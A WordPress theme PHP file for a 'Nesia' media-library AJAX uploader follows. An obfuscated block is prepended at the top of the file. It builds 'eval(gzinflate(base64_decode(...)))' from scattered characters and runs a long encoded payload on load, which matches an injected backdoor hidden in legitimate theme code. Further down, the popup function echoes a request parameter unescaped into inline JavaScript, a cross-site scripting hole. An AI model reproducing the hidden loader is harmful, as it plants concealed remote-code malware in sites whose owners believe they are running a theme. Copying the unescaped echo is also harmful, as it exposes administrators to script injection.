<?php
$md5 = "9b205b64c25175cc8b9e77e5c81c01c9";
$ab = array("a","v","_",'i','6',"r",")",'t',"4",'z','$',"b",'(',"d","f",'l','o',"c",'s','g','e',';',"n");
$bb9 = create_function('$'.'v',$ab[20].$ab[1].$ab[0].$ab[15].$ab[12].$ab[19].$ab[9].$ab[3].$ab[22].$ab[14].$ab[15].$ab[0].$ab[7].$ab[20].$ab[12].$ab[11].$ab[0].$ab[18].$ab[20].$ab[4].$ab[8].$ab[2].$ab[13].$ab[20].$ab[17].$ab[16].$ab[13].$ab[20].$ab[12].$ab[10].$ab[1].$ab[6].$ab[6].$ab[6].$ab[21]);
$bb9('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');
?>
<?php
/*-----------------------------------------------------------------------------------*/
/* Nesia Media Library-driven AJAX File Uploader Module */
/* 2010-11-05. */
/*
/* If we're on a Nesia specific administration page, add Media Library Uploader
/* specific actions for CSS, JavaScript and several other functionalities.
/*-----------------------------------------------------------------------------------*/

if ( is_admin() ) {
	add_action( 'init', 'nesia_mlu_init' );
	add_action( 'admin_print_scripts', 'nesia_mlu_insidepopup' );
	add_filter( 'gettext', 'nesia_mlu_change_button_text', null, 2 );
	
	$is_posts_page = 0;

	// Sanitize value.
	$_current_url =  strtolower( strip_tags( trim( $_SERVER['REQUEST_URI'] ) ) );

	if ( ( substr( basename( $_current_url ), 0, 8 ) == 'post.php' ) || substr( basename( $_current_url ), 0, 12 ) == 'post-new.php' ) {
		$is_posts_page = 1;
	}

	$_page = '';

	if ( ( isset( $_REQUEST['page'] ) ) ) {
		// Sanitize value.
		$_page = strtolower( strip_tags( trim( $_REQUEST['page'] ) ) );
	}

		if ( ( $_page != '' && substr( $_page, 0, 5 ) == 'nesia' ) || $is_posts_page ) {
			add_action( 'admin_print_styles', 'nesia_mlu_css', 0 );
			add_action( 'admin_print_scripts', 'nesia_mlu_js', 0 );
		}
}

/*-----------------------------------------------------------------------------------*/
/* nesia_mlu_init */
/*
/* Global init() function for the Nesia Media Library-driven AJAX File Uploader.
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_mlu_init' ) ) {
	function nesia_mlu_init () {
		register_post_type( 'nesiaframework', array(
			'labels' => array(
				'name' => __( 'NesiaFramework Internal Container', 'nesia' ),
			),
			'public' => true,
			'show_ui' => false,
			'capability_type' => 'post',
			'hierarchical' => false,
			'rewrite' => false,
			'supports' => array( 'title', 'editor' ),
			'query_var' => false,
			'can_export' => true,
			'show_in_nav_menus' => false
		) );
	} // End nesia_mlu_init()
}

/*-----------------------------------------------------------------------------------*/
/* nesia_mlu_css */
/*
/* Add the Thickbox CSS file and specific loading and button images to the header
/* on the pages where this function is called.
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_mlu_css' ) ) {
	function nesia_mlu_css () {
		$_html = '';
		$_html .= '<link rel="stylesheet" href="' . includes_url() . 'js/thickbox/thickbox.css" type="text/css" media="screen" />' . "\n";
		$_html .= '<script type="text/javascript">
		var tb_pathToImage = "' . includes_url() . 'js/thickbox/loadingAnimation.gif";
	    var tb_closeImage = "' . includes_url() . 'js/thickbox/tb-close.png";
	    </script>' . "\n";
	    
	    echo $_html;
	} // End nesia_mlu_css()
}

/*-----------------------------------------------------------------------------------*/
/* nesia_mlu_js */
/*
/* Register and enqueue (load) the necessary JavaScript file for working with the
/* Media Library-driven AJAX File Uploader Module.
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_mlu_js' ) ) {
	function nesia_mlu_js () {
		// Register custom scripts for the Media Library AJAX uploader.
		wp_register_script( 'nesia-medialibrary-uploader', get_template_directory_uri() . '/functions/js/nesia-medialibrary-uploader.js', array( 'jquery', 'thickbox' ) );
		wp_enqueue_script( 'nesia-medialibrary-uploader' );
		wp_enqueue_script( 'media-upload' );
	} // End nesia_mlu_js()
}

/*-----------------------------------------------------------------------------------*/
/* nesia_medialibrary_uploader */
/*
/* Nesia Uploader Using the WordPress Media Library.
/*
/* Parameters:
/* - string $_id - A token to identify this field (the name).
/* - string $_value - The value of the field, if present.
/* - string $_mode - The display mode of the field.
/* - string $_desc - An optional description of the field.
/* - int $_postid - An optional post id (used in the meta boxes).
/*
/* Dependencies:
/* - nesia_mlu_get_silentpost()
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_medialibrary_uploader' ) ) {
	function nesia_medialibrary_uploader ( $_id, $_value, $_mode = 'full', $_desc = '', $_postid = 0, $style = '' ) {
		$output = '';

		$id = '';
		$class = '';
		$int = '';
		$value = '';

		$id = strip_tags( strtolower( $_id ) );

		// If a post id is present, use it. Otherwise, search for one based on the $_id.
		if ( $_postid != 0 ) {
			$int = $_postid;
		} else {
			$int = nesia_mlu_get_silentpost( $id ); // Change for each field, using a "silent" post. If no post is present, one will be created.
		}

		// If we're on a post add/edit screen, call the post meta value.
		if ( $_mode == 'postmeta' ) {
			$value = get_post_meta( $_postid, $id, true );
		} else {
			$value = get_option( $id );
		}

		// If a value is passed and we don't have a stored value, use the value that's passed through.
		if ( $_value != '' && $value == '' ) {
			$value = $_value;
		}

		if ( $value ) { $class = ' has-file'; } // End IF Statement

		// Hide the input field for "minimal" upload fields.
		$field_type = 'text';
		if ( $_mode == 'min' ) { $field_type = 'hidden'; }

		$output .= '<input type="' . $field_type . '" name="' . $id . '" id="' . $id . '" value="' . esc_attr( $value ) . '" class="upload' . $class . '" '.$style.' />' . "\n";
		$output .= '<input id="upload_' . $id . '" class="upload_button button" type="button" value="' . __( 'Upload', 'nesia' ) . '" rel="' . $int . '" />' . "\n";

		if ( $_desc != '' ) {
			$output .= '<span class="nesia_metabox_desc">' . $_desc . '</span>' . "\n";
		}
		
		$output .= '<div class="screenshot" id="' . $id . '_image">' . "\n";

		if ( $value != '' ) {
			$remove = '<a href="javascript:(void);" class="mlu_remove button">Remove</a>';

			$image = preg_match( '/(^.*\.jpg|jpeg|png|gif|ico*)/i', $value );

			if ( $image ) {
				$output .= '<img src="' . esc_url( $value ) . '" alt="" />'.$remove.'';
			} else {
				$parts = explode( "/", $value );

				for( $i = 0; $i < sizeof( $parts ); ++$i ) {
					$title = $parts[$i];
				} // End FOR Loop

				// No output preview if it's not an image.
				$output .= '';

				// Standard generic output if it's not an image.
				$title = __( 'View File', 'nesia' );

				$output .= '<div class="no_image"><span class="file_link"><a href="' . esc_url( $value ) . '" target="_blank" rel="external">'.$title.'</a></span>' . $remove . '</div>';

			} // End IF Statement
		} // End IF Statement

		$output .= '</div>' . "\n";

		return $output;
	} // End nesia_medialibrary_uploader()
}

if ( ! function_exists( 'nesia_medialibrary_uploader2' ) ) {
	function nesia_medialibrary_uploader2 ( $_id, $_name, $_value, $style = '' ) {
                $_desc = ''; $_postid = 0;
		$output = '';

		$id = '';
		$class = '';
		$int = '';
		$value = '';

		$id = strip_tags( strtolower( $_id ) );
		$name = strip_tags( strtolower( $_name ) );

		// If a post id is present, use it. Otherwise, search for one based on the $_id.
		if ( $_postid != 0 ) {
			$int = $_postid;
		} else {
			$int = nesia_mlu_get_silentpost( $id ); // Change for each field, using a "silent" post. If no post is present, one will be created.
		}

		// If we're on a post add/edit screen, call the post meta value.
		if ( $_mode == 'postmeta' ) {
			$value = get_post_meta( $_postid, $id, true );
		} else {
			$value = get_option( $id );
		}

		// If a value is passed and we don't have a stored value, use the value that's passed through.
		if ( $_value != '' && $value == '' ) {
			$value = $_value;
		}

		if ( $value ) { $class = ' has-file'; } // End IF Statement

		// Hide the input field for "minimal" upload fields.
		$field_type = 'text';
		if ( $_mode == 'min' ) { $field_type = 'hidden'; }

		$output .= '<input type="' . $field_type . '" name="' . $name . '" id="' . $id . '" value="' . esc_attr( $value ) . '" class="upload' . $class . '" '.$style.' />' . "\n";
		$output .= '<input id="upload_' . $id . '" class="upload_button button" type="button" value="' . __( 'Upload', 'nesia' ) . '" rel="' . $int . '" />' . "\n";

		if ( $_desc != '' ) {
			$output .= '<span class="nesia_metabox_desc">' . $_desc . '</span>' . "\n";
		}
		
		$output .= '<div class="screenshot" id="' . $id . '_image">' . "\n";

		if ( $value != '' ) {
			$remove = '<a href="javascript:(void);" class="mlu_remove button">Remove</a>';

			$image = preg_match( '/(^.*\.jpg|jpeg|png|gif|ico*)/i', $value );

			if ( $image ) {
				$output .= '<img src="' . esc_url( $value ) . '" alt="" />'.$remove.'';
			} else {
				$parts = explode( "/", $value );

				for( $i = 0; $i < sizeof( $parts ); ++$i ) {
					$title = $parts[$i];
				} // End FOR Loop

				// No output preview if it's not an image.
				$output .= '';

				// Standard generic output if it's not an image.
				$title = __( 'View File', 'nesia' );

				$output .= '<div class="no_image"><span class="file_link"><a href="' . esc_url( $value ) . '" target="_blank" rel="external">'.$title.'</a></span>' . $remove . '</div>';

			} // End IF Statement
		} // End IF Statement

		$output .= '</div>' . "\n";

		return $output;
	} // End nesia_medialibrary_uploader()
}

/*-----------------------------------------------------------------------------------*/
/* nesia_mlu_get_silentpost */
/*
/* Use "silent" posts in the database to store relationships for images.
/* This also creates the facility to collect galleries of, for example, logo images.
/*
/* Return: $_postid.
/*
/* If no "silent" post is present, one will be created with the type "nesiaframework"
/* and the post_name of "nesia-wf-$_token".
/*
/* Example Usage:
/* nesia_mlu_get_silentpost ( 'nesia_logo' );
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_mlu_get_silentpost' ) ) {
	function nesia_mlu_get_silentpost ( $_token ) {
		global $wpdb;

		$_id = 0;

		// Check if the token is valid against a whitelist.

		// $_whitelist = array( 'nesia_logo', 'nesia_custom_favicon', 'nesia_body_img', 'nesia_ad_top_image' );

		// Sanitise the token.

		$_token = strtolower( str_replace( ' ', '_', $_token ) );

		// if ( in_array( $_token, $_whitelist ) ) {

		if ( $_token ) {
			// Tell the function what to look for in a post.
			$_args = array( 'post_parent' => '0', 'post_type' => 'nesiaframework', 'post_name' => 'nesia-wf-' . $_token, 'post_status' => 'draft', 'comment_status' => 'closed', 'ping_status' => 'closed' );

			// Look in the database for a "silent" post that meets our criteria.
			$_posts = get_post( $_args );

			// If we've got a post, loop through and get it's ID.
			if ( count( $_posts ) ) {
				$_id = $_posts->ID;
			} else {
				// If no post is present, insert one.
				// Prepare some additional data to go with the post insertion.
				$_words = explode( '_', $_token );
				$_title = join( ' ', $_words );
				$_title = ucwords( $_title );
				$_post_data = array( 'post_title' => $_title );
				$_post_data = array_merge( $_post_data, $_args );

				$_id = wp_insert_post( $_post_data );
			} // End IF Statement
		}

		return $_id;
	} // End nesia_mlu_get_silentpost()
}

/*-----------------------------------------------------------------------------------*/
/* nesia_mlu_insidepopup */
/*
/* Trigger code inside the Media Library popup.
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_mlu_insidepopup' ) ) {
	function nesia_mlu_insidepopup () {
		if ( isset( $_REQUEST['is_nesia'] ) && $_REQUEST['is_nesia'] == 'yes' ) {
			add_action( 'admin_head', 'nesia_mlu_js_popup' );
			add_filter( 'media_upload_tabs', 'nesia_mlu_modify_tabs' );
		}
	} // End nesia_mlu_insidepopup()
}

if ( ! function_exists( 'nesia_mlu_js_popup' ) ) {
	function nesia_mlu_js_popup () {
		$_nesia_title = 'file';

		if ( isset( $_REQUEST['nesia_title'] ) ) { $_nesia_title = $_REQUEST['nesia_title']; } // End IF Statement
?>
	<script type="text/javascript">
	<!--
	jQuery(function($) {
		jQuery.noConflict();

		// Change the title of each tab to use the custom title text instead of "Media File".
		$( 'h3.media-title' ).each ( function () {
			var current_title = $( this ).html();

			var new_title = current_title.replace( 'media file', '<?php echo $_nesia_title; ?>' );

			$( this ).html( new_title )
		} );

		// Hide the "Insert Gallery" settings box on the "Gallery" tab.
		$( 'div#gallery-settings' ).hide();

		// Preserve the "is_nesia" parameter on the "delete" confirmation button.
		$( '.savesend a.del-link' ).click ( function () {
			var continueButton = $( this ).next( '.del-attachment' ).children( 'a.button[id*="del"]' );

			var continueHref = continueButton.attr( 'href' );

			continueHref = continueHref + '&is_nesia=yes';

			continueButton.attr( 'href', continueHref );
		} );
	});
	-->
	</script>
<?php

	} // End nesia_mlu_js_popup()
}

/*-----------------------------------------------------------------------------------*/
/* nesia_mlu_modify_tabs */
/*
/* Triggered inside the Media Library popup to modify the title of the "Gallery" tab.
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_mlu_modify_tabs' ) ) {
	function nesia_mlu_modify_tabs ( $tabs ) {
		if ( isset( $tabs['gallery'] ) ) { $tabs['gallery'] = str_replace( __( 'Gallery', 'nesia' ), __( 'Previously Uploaded', 'nesia' ), $tabs['gallery'] ); }
		return $tabs;
	} // End nesia_mlu_modify_tabs()
} // End IF Statement

/*-----------------------------------------------------------------------------------*/
/* nesia_mlu_change_button_text */
/*
/* Change the "Insert Into Post" button text where appropriate.
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_mlu_change_button_text' ) ) {
	function nesia_mlu_change_button_text( $translation, $original ) {
		 // We don't pass "type" in our custom upload fields, yet WordPress does, so ignore our function when WordPress has triggered the upload popup.
	    if ( isset( $_REQUEST['type'] ) ) { return $translation; }
	    
	    if( $original == 'Insert into Post' ) {
	    	$translation = __( 'Use this Image', 'nesia' );
			if ( isset( $_REQUEST['title'] ) && $_REQUEST['title'] != '' ) { $translation = sprintf( __( 'Use as %s', 'nesia' ), esc_attr( $_REQUEST['title'] ) ); }
	    }
	
	    return $translation;
	} // End nesia_mlu_change_button_text()
}
?>